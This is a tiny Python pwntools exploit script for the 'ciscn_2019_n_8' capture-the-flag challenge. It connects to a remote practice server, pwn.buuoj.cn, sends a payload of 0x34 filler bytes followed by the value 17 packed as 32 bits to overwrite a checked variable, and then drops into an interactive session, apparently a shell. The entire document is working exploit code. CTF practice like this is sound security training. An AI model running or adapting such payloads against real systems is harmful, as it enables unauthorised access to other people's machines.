from pwn import *
context.log_level = 'debug'
#p = process("./ciscn_2019_n_8")
p = remote("pwn.buuoj.cn", 20144)
payload = 'a' * 0x34 + p32(17)
p.sendline(payload)

p.interactive()
